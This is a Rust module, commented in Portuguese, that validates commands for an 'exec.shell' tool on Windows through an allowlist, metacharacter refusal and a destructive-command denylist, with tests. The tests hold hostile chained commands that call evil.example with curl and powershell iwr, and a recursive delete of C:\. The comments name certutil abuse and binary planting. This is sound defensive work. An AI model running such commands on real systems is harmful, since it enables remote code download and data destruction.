//! Validação de comando pra `exec.shell` (Etapa 2b da Fase 8,
//! ADR-0044; originalmente Etapa 7 da Fase 7, ADR-0034 §D3).
//! Ver `docs/architecture/exec-tools-specification.md`
//! §"`FilesExecShellTool`".
//!
//! ## O que este módulo decide
//!
//! [`plan_command`] é a porta única: recebe o command string cru e
//! devolve **qual programa executar e com quais argumentos**, ou a
//! razão da recusa. Nenhum caminho de `exec.shell` chega ao spawn
//! sem passar por aqui.
//!
//! ## Por que o `cmd.exe` não resolve mais o programa
//!
//! A v1 (Etapa 7 da Fase 7) entregava o command string **inteiro**
//! pro `cmd.exe /c` e validava só o primeiro token. O ADR-0037
//! mediu o resultado: `echo x & <qualquer coisa>` passava pelos
//! dois gates, porque o `cmd.exe` interpreta `&`, `&&`, `|` e `||`
//! como separadores. A allowlist não era uma barreira — era
//! decoração.
//!
//! A Etapa 2b tira o `cmd.exe` do papel de resolvedor:
//!
//! - o comando é tokenizado **aqui**, não pelo shell;
//! - metacaracteres são **recusados**, não escapados ([`SHELL_METACHARACTERS`]);
//! - o primeiro token resolve numa entrada de uma lista fechada
//!   ([`resolve_program`]) — builtin do `cmd.exe` ou executável
//!   nativo do `System32` **por caminho absoluto**;
//! - os argumentos vão como `argv` controlado, nunca como texto pra
//!   um shell reinterpretar.
//!
//! Recusar em vez de escapar é decisão do ADR-0037 §D5: as regras
//! de quoting do `cmd.exe` são notoriamente inconsistentes, e um
//! escapador próprio seria superfície nova.
//!
//! **Consequência medida (ADR-0044):** sem o `cmd.exe` procurando o
//! binário, some o sequestro por diretório corrente. O `cmd.exe`
//! busca no CWD **antes** do `PATH`, e o CWD do filho é o workspace
//! — onde o `files.write` escreve. Com a v1, plantar `find.bat` no
//! workspace e pedir `find alfa arquivo.txt` executava o arquivo
//! plantado. Fixado em teste de negação.

/// Caracteres que o `cmd.exe` trata como sintaxe, não como dado.
/// Comando que contenha qualquer um é **recusado antes do spawn**
/// ([`plan_command`]), nunca escapado.
///
/// Um a um, e por que cada um está aqui:
///
/// - `&` — separador de comandos (`a & b` roda os dois). Cobre
///   também `&&`, que é o mesmo caractere repetido.
/// - `|` — pipe e, dobrado (`||`), separador condicional.
/// - `<`, `>` — redirecionamento de entrada e saída.
/// - `^` — escape do `cmd.exe`; existe justamente pra fazer os
///   outros passarem despercebidos por um filtro ingênuo.
/// - `(`, `)` — agrupamento de comandos.
/// - `%` — expansão de variável de ambiente.
/// - `!` — expansão atrasada. Desligada por padrão, mas ligável
///   pelo registro (`HKCU\...\Command Processor\DelayedExpansion`).
///   O spawn passa `/v:off` explícito **e** o caractere é recusado
///   aqui — as duas coisas, porque uma sozinha depende de o `/v:off`
///   nunca ser removido por engano.
/// - `\n`, `\r` — quebra de linha separa comandos como o `&`.
/// - `\0` — trunca a string do lado do Win32; o que vem depois
///   fica invisível pra qualquer validação feita em Rust.
///
/// **A aspa (`"`) não está na lista** e isso é deliberado: ela é o
/// único jeito de um argumento conter espaço, e sem `cmd.exe` no
/// caminho de resolução ela não pode separar comando nenhum. O
/// tokenizador ([`split_command`]) a consome como delimitador e
/// exige que esteja balanceada — ela nunca chega ao filho como
/// texto.
pub const SHELL_METACHARACTERS: &[char] = &[
    '&', '|', '<', '>', '^', '(', ')', '%', '!', '\n', '\r', '\0',
];

/// Comandos destrutivos recusados antes de qualquer outra coisa.
/// Substring case-insensitive contra o command string inteiro (não
/// só o primeiro token — `rm -rf` tem 2 palavras).
///
/// **Esta lista é redundante por construção desde o ADR-0044**, e
/// isso é intencional. Nenhum dos padrões abaixo é expressável com
/// a allowlist atual: `rm`, `format`, `reg` e companhia não são
/// builtin nem estão no [`SHELL_SYSTEM32_DEFAULT`], então
/// [`resolve_program`] já os recusaria. A denylist fica como
/// tripwire pro dia em que a allowlist crescer — e a redundância é
/// **verificada em teste** (`denylist_is_redundant_with_allowlist`),
/// não assumida.
///
/// O que ela **não** é: uma barreira. A v1 tratava-a como camada de
/// defesa e o ADR-0037 mostrou o custo disso. Ela casa substring
/// literal, então `rm -r -f` (flags separadas) não casa `rm -rf` —
/// desvio conhecido, fixado em teste
/// (`denylist_hit_documents_split_flag_bypass`) e irrelevante hoje,
/// já que `rm` não resolve.
pub const SHELL_DENYLIST: &[&str] = &[
    "rm -rf",
    "del /f /s /q",
    "remove-item -recurse -force",
    "format",
    "diskpart",
    "bcdedit",
    "reg delete",
    "net user",
    "net localgroup",
    "cipher /w",
    "sfc /scannow",
];

/// Builtins do `cmd.exe` aceitos. Não são arquivos — vivem dentro
/// do próprio `cmd.exe`, então rodam via `cmd.exe /d /v:off /c
/// <nome> <args>` e não há caminho absoluto a resolver.
///
/// Todos medidos rodando sob `Mandatory Label\Low` (ADR-0044
/// §Contexto). Todos read-only sobre o workspace: `cd` sem
/// argumento imprime o diretório e com argumento só afeta a
/// instância efêmera do `cmd.exe`.
pub const SHELL_BUILTINS_DEFAULT: &[&str] = &["cd", "dir", "echo", "type", "ver", "vol"];

/// Executáveis nativos do `System32` aceitos: `(token, arquivo)`.
/// O arquivo importa porque nem todos são `.exe` — `more` e `tree`
/// são `.com`, e resolver por extensão suposta erra.
///
/// Todos medidos rodando sob `Mandatory Label\Low` com spawn direto
/// por caminho absoluto (ADR-0044 §Contexto), e todos read-only.
///
/// **O que foi medido e ficou de fora, por decisão:**
///
/// - `curl`, `tar`, `certutil` — rodam, mas são caminho de saída de
///   rede e de escrita em disco (o `certutil -urlcache` é LOLBIN
///   clássico). Uma allowlist de inspeção não os inclui.
/// - `attrib` — sem argumento é read-only, com argumento escreve.
///   Allowlist não sabe distinguir, então não entra.
/// - `whoami`, `hostname`, `tasklist`, `ipconfig` — rodam e são
///   read-only, mas devolvem identidade e estado do **host**, não
///   do workspace. Ficam de fora por não ser o que a ferramenta se
///   propõe a fazer.
/// - `find` — roda, mas exige aspas literais na linha de comando
///   pro termo de busca, o que só existe quando um shell monta a
///   linha. Com `argv` controlado ele recusa (`FIND: formato de
///   parâmetro incorreto`, medido). O `findstr` faz o mesmo melhor.
/// - `where` — depende de `PATH`, que o filho não tem (ver
///   §Contexto do ADR-0044). Retornaria erro sempre.
pub const SHELL_SYSTEM32_DEFAULT: &[(&str, &str)] = &[
    ("fc", "fc.exe"),
    ("findstr", "findstr.exe"),
    ("more", "more.com"),
    ("sort", "sort.exe"),
    ("tree", "tree.com"),
];

/// Como o programa resolvido deve ser executado.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellProgram {
    /// Builtin do `cmd.exe`. O caller executa
    /// `cmd.exe /d /v:off /c <name> <args...>`.
    Builtin {
        /// Nome canônico do builtin (minúsculo).
        name: &'static str,
    },
    /// Executável nativo do `System32`. O caller monta
    /// `%SystemRoot%\System32\<file_name>` e faz spawn **direto** —
    /// sem `cmd.exe` no meio.
    System32 {
        /// Nome canônico do comando (minúsculo).
        name: &'static str,
        /// Arquivo em `System32` (com extensão real).
        file_name: &'static str,
    },
}

/// Comando validado e pronto pro spawn.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlannedCommand {
    /// Programa resolvido.
    pub program: ShellProgram,
    /// Argumentos já tokenizados, sem as aspas delimitadoras.
    /// Vão como `argv`, nunca como texto pra um shell.
    pub args: Vec<String>,
}

/// Por que um comando foi recusado. Toda variante acontece
/// **antes** do spawn — nenhum Job Object ou processo é criado
/// para um comando recusado.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandRejection {
    /// Command string vazio ou só espaços.
    Empty,
    /// Bate um padrão da [`SHELL_DENYLIST`].
    Denylisted(&'static str),
    /// Contém um caractere de [`SHELL_METACHARACTERS`].
    Metacharacter(char),
    /// Aspas não balanceadas — o tokenizador não adivinha intenção.
    UnbalancedQuote,
    /// Primeiro token não resolve em builtin nem em executável da
    /// lista fechada. Carrega o token pra mensagem de erro.
    NotAllowed(String),
}

impl std::fmt::Display for CommandRejection {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Empty => f.write_str("comando vazio"),
            Self::Denylisted(pat) => {
                write!(f, "comando recusado pela denylist (padrao: {pat})")
            }
            Self::Metacharacter(c) => write!(
                f,
                "comando contem o metacaractere de shell {c:?} — \
                 exec.shell nao interpreta sintaxe de shell (sem pipe, \
                 redirecionamento, encadeamento ou expansao de variavel)"
            ),
            Self::UnbalancedQuote => f.write_str("aspas nao balanceadas no comando"),
            Self::NotAllowed(token) => {
                write!(f, "comando '{token}' nao esta na allowlist de exec.shell")
            }
        }
    }
}

/// Normaliza um command string pra comparação da denylist:
/// minúsculo + espaços em sequência colapsados em um único espaço.
fn normalize(command: &str) -> String {
    command
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_ascii_lowercase()
}

/// Retorna o padrão da [`SHELL_DENYLIST`] que casou, se houver.
#[must_use]
pub fn denylist_hit(command: &str) -> Option<&'static str> {
    let normalized = normalize(command);
    SHELL_DENYLIST
        .iter()
        .find(|pat| normalized.contains(*pat))
        .copied()
}

/// Retorna o primeiro caractere de [`SHELL_METACHARACTERS`] presente
/// no comando, se houver.
#[must_use]
pub fn metacharacter_hit(command: &str) -> Option<char> {
    command.chars().find(|c| SHELL_METACHARACTERS.contains(c))
}

/// Primeiro token (whitespace-delimited) do command string, ou
/// `None` se o comando é vazio/só espaços.
#[must_use]
pub fn first_token(command: &str) -> Option<&str> {
    command.split_whitespace().next()
}

/// Resolve o primeiro token num programa da lista fechada.
/// `None` = não está na allowlist.
#[must_use]
pub fn resolve_program(token: &str) -> Option<ShellProgram> {
    let lower = token.to_ascii_lowercase();
    if let Some(name) = SHELL_BUILTINS_DEFAULT
        .iter()
        .find(|b| **b == lower)
        .copied()
    {
        return Some(ShellProgram::Builtin { name });
    }
    SHELL_SYSTEM32_DEFAULT
        .iter()
        .find(|(name, _)| *name == lower)
        .map(|(name, file_name)| ShellProgram::System32 { name, file_name })
}

/// Tokeniza o command string em `argv`.
///
/// **Não é um parser de shell** e não pretende ser: separa por
/// espaço, entende aspa dupla como delimitador de um token com
/// espaços, e para por aí. Sem escapes, sem expansão de variável,
/// sem globbing, sem substituição de comando.
///
/// **Por que a contrabarra não escapa nada:** no Windows ela é
/// separador de caminho. Tratá-la como escape quebraria
/// `type sub\arquivo.txt`, que é o uso normal. Como consequência,
/// um argumento não pode conter aspa literal — limitação declarada,
/// não esquecida.
///
/// Aspas não balanceadas são erro, não chute.
pub fn split_command(command: &str) -> Result<Vec<String>, CommandRejection> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    let mut has_token = false;

    for c in command.chars() {
        match c {
            '"' => {
                in_quotes = !in_quotes;
                // Uma aspa por si só já inicia um token: `type ""`
                // deve produzir um argumento vazio, não sumir.
                has_token = true;
            }
            c if c.is_whitespace() && !in_quotes => {
                if has_token {
                    tokens.push(std::mem::take(&mut current));
                    has_token = false;
                }
            }
            c => {
                current.push(c);
                has_token = true;
            }
        }
    }
    if in_quotes {
        return Err(CommandRejection::UnbalancedQuote);
    }
    if has_token {
        tokens.push(current);
    }
    if tokens.is_empty() {
        return Err(CommandRejection::Empty);
    }
    Ok(tokens)
}

/// Porta única de validação do `exec.shell`: do command string cru
/// ao par (programa, `argv`), ou à razão da recusa.
///
/// Ordem dos gates — todos pré-spawn, então a ordem é sobre
/// qualidade da mensagem de erro, não sobre segurança:
///
/// 1. vazio;
/// 2. denylist (recusa dura, mensagem mais específica);
/// 3. metacaracteres;
/// 4. tokenização;
/// 5. resolução do programa contra a lista fechada.
pub fn plan_command(command: &str) -> Result<PlannedCommand, CommandRejection> {
    if command.trim().is_empty() {
        return Err(CommandRejection::Empty);
    }
    if let Some(pattern) = denylist_hit(command) {
        return Err(CommandRejection::Denylisted(pattern));
    }
    if let Some(c) = metacharacter_hit(command) {
        return Err(CommandRejection::Metacharacter(c));
    }
    let tokens = split_command(command)?;
    let (head, args) = tokens.split_first().ok_or(CommandRejection::Empty)?;
    let program =
        resolve_program(head).ok_or_else(|| CommandRejection::NotAllowed(head.clone()))?;
    Ok(PlannedCommand {
        program,
        args: args.to_vec(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---------- denylist ----------

    #[test]
    fn denylist_hit_catches_rm_rf() {
        assert_eq!(denylist_hit("rm -rf /"), Some("rm -rf"));
    }

    #[test]
    fn denylist_hit_case_insensitive_and_whitespace_tolerant() {
        assert_eq!(
            denylist_hit("DEL   /F /S /Q  C:\\foo"),
            Some("del /f /s /q")
        );
    }

    #[test]
    fn denylist_hit_none_for_safe_command() {
        assert_eq!(denylist_hit("dir"), None);
    }

    #[test]
    fn denylist_hit_documents_split_flag_bypass() {
        // Limitação conhecida do match por substring literal. Desde
        // o ADR-0044 ela não tem consequência: `rm` não resolve em
        // programa nenhum, então o comando morre no gate seguinte —
        // o que o teste abaixo prova.
        assert_eq!(denylist_hit("rm -r -f /"), None);
        assert_eq!(
            plan_command("rm -r -f /"),
            Err(CommandRejection::NotAllowed("rm".to_string())),
            "a allowlist tem de pegar o que a denylist deixou passar"
        );
    }

    #[test]
    fn denylist_hit_matches_reg_delete_mid_command() {
        assert_eq!(
            denylist_hit("reg delete HKCU\\Software\\Foo /f"),
            Some("reg delete")
        );
    }

    /// **A redundância da denylist é verificada, não assumida.**
    ///
    /// Se um dia alguém acrescentar à allowlist um programa que
    /// aparece na denylist, este teste quebra e a contradição fica
    /// visível — em vez de a denylist virar a única barreira de
    /// novo, que foi o erro que o ADR-0037 mediu.
    #[test]
    fn denylist_is_redundant_with_allowlist() {
        for pattern in SHELL_DENYLIST {
            let head = pattern.split_whitespace().next().unwrap_or("");
            assert!(
                resolve_program(head).is_none(),
                "'{head}' esta na denylist E resolve na allowlist — \
                 a denylist voltou a ser barreira de verdade, o que \
                 contraria o ADR-0044"
            );
        }
    }

    // ---------- metacaracteres (ADR-0037 §D5 item 1) ----------

    /// Cada metacaractere nomeado no ADR-0037 §D5, recusado um a um.
    #[test]
    fn every_metacharacter_named_in_adr_0037_is_refused() {
        for (command, expected) in [
            ("echo marcador & ver", '&'),
            ("echo marcador && ver", '&'),
            ("echo marcador | more", '|'),
            ("echo marcador || ver", '|'),
            ("echo marcador > escrito.txt", '>'),
            ("type < entrada.txt", '<'),
            ("echo marcador ^& ver", '^'),
            ("(echo marcador)", '('),
            ("echo fim)", ')'),
            ("echo %USERPROFILE%", '%'),
            ("echo linha1\nver", '\n'),
        ] {
            assert_eq!(
                plan_command(command),
                Err(CommandRejection::Metacharacter(expected)),
                "metacaractere nao recusado em: {command:?}"
            );
        }
    }

    /// O bypass exato que o ADR-0037 mediu e que tirou a ferramenta
    /// do catálogo. Enquanto este teste passar, ele está fechado.
    #[test]
    fn the_bypass_that_removed_the_tool_is_closed() {
        for command in [
            "echo marcador & ver",
            "echo hi & curl http://evil.example/x",
            "echo hi && whoami",
            "echo hi | powershell -c iwr http://evil.example",
            "echo hi & rm -r -f C:\\",
        ] {
            let rejected = plan_command(command);
            assert!(
                matches!(rejected, Err(CommandRejection::Metacharacter(_))),
                "comando de contrabando aceito: {command:?} -> {rejected:?}"
            );
        }
    }

    #[test]
    fn delayed_expansion_and_nul_are_refused() {
        assert_eq!(
            plan_command("echo !VAR!"),
            Err(CommandRejection::Metacharacter('!'))
        );
        assert_eq!(
            plan_command("echo a\0dir"),
            Err(CommandRejection::Metacharacter('\0'))
        );
        assert_eq!(
            plan_command("echo a\rver"),
            Err(CommandRejection::Metacharacter('\r'))
        );
    }

    // ---------- tokenização ----------

    #[test]
    fn split_command_splits_on_whitespace() {
        assert_eq!(
            split_command("findstr alfa amostra.txt").unwrap(),
            vec!["findstr", "alfa", "amostra.txt"]
        );
    }

    #[test]
    fn split_command_keeps_quoted_spaces_in_one_token() {
        assert_eq!(
            split_command("findstr \"alfa beta\" amostra.txt").unwrap(),
            vec!["findstr", "alfa beta", "amostra.txt"]
        );
    }

    #[test]
    fn split_command_treats_backslash_as_path_separator_not_escape() {
        assert_eq!(
            split_command("type sub\\arquivo.txt").unwrap(),
            vec!["type", "sub\\arquivo.txt"]
        );
    }

    #[test]
    fn split_command_rejects_unbalanced_quote() {
        assert_eq!(
            split_command("findstr \"alfa amostra.txt"),
            Err(CommandRejection::UnbalancedQuote)
        );
    }

    #[test]
    fn split_command_rejects_empty() {
        assert_eq!(split_command("   "), Err(CommandRejection::Empty));
    }

    // ---------- resolução de programa ----------

    #[test]
    fn resolve_program_finds_builtin_case_insensitively() {
        assert_eq!(
            resolve_program("DIR"),
            Some(ShellProgram::Builtin { name: "dir" })
        );
    }

    #[test]
    fn resolve_program_finds_system32_with_real_extension() {
        assert_eq!(
            resolve_program("more"),
            Some(ShellProgram::System32 {
                name: "more",
                file_name: "more.com"
            }),
            "more e .com, nao .exe — resolver por extensao suposta erra"
        );
        assert_eq!(
            resolve_program("findstr"),
            Some(ShellProgram::System32 {
                name: "findstr",
                file_name: "findstr.exe"
            })
        );
    }

    #[test]
    fn resolve_program_rejects_everything_else() {
        for token in [
            "curl",
            "certutil",
            "tar",
            "powershell",
            "whoami",
            "attrib",
            "find",
            "where",
            "ls",
            "cat",
            "grep",
            "rm",
            "",
        ] {
            assert!(
                resolve_program(token).is_none(),
                "'{token}' nao deveria resolver"
            );
        }
    }

    /// Um programa não entra na allowlist por caminho absoluto.
    /// Sem isto, `C:\Windows\System32\curl.exe` contornaria a lista
    /// fechada inteira.
    #[test]
    fn absolute_path_is_not_a_way_into_the_allowlist() {
        for command in [
            r"C:\Windows\System32\curl.exe --version",
            r"C:\Windows\System32\findstr.exe alfa",
            r".\findstr alfa",
            r"..\..\findstr alfa",
        ] {
            assert!(
                matches!(plan_command(command), Err(CommandRejection::NotAllowed(_))),
                "caminho aceito como programa: {command:?}"
            );
        }
    }

    // ---------- plano completo ----------

    #[test]
    fn plan_command_builds_builtin_plan() {
        assert_eq!(
            plan_command("type amostra.txt").unwrap(),
            PlannedCommand {
                program: ShellProgram::Builtin { name: "type" },
                args: vec!["amostra.txt".to_string()],
            }
        );
    }

    #[test]
    fn plan_command_builds_system32_plan() {
        assert_eq!(
            plan_command("findstr \"alfa beta\" amostra.txt").unwrap(),
            PlannedCommand {
                program: ShellProgram::System32 {
                    name: "findstr",
                    file_name: "findstr.exe"
                },
                args: vec!["alfa beta".to_string(), "amostra.txt".to_string()],
            }
        );
    }

    #[test]
    fn plan_command_rejects_empty() {
        assert_eq!(plan_command("   "), Err(CommandRejection::Empty));
    }

    /// A denylist é consultada antes da allowlist — a mensagem de
    /// "comando destrutivo" é mais útil que "não está na lista".
    #[test]
    fn plan_command_reports_denylist_before_allowlist() {
        assert_eq!(
            plan_command("rm -rf /"),
            Err(CommandRejection::Denylisted("rm -rf"))
        );
    }
}
